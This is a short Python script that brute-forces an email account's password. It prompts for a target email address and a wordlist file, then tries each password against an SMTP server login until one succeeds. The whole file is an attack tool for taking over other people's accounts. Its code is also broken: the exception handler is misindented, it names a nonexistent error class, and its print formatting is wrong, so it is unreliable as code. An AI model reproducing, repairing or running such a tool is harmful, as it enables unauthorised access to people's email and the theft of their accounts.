from readline import set_completion_display_matches_hook
from smtpd import SMTPServer
import smtplib


smtpserver = smtplib.SMTP ("server", "port")

smtpserver.ehlo()

smtpserver.starttls()


user = input ('[@] Enter Target Email : ')


passwfile = input ("Enter password file : ")

passwfile = open(passwfile , "r")

for password in passwfile :
    try :
        smtpserver.login(user, password)
        print ("[+] i found Password ==>%s") % password
        break;
        except smtplib.smtplib.SMTPAuthenticationError:
            print("[!] wrong passwords ===> %s") % password



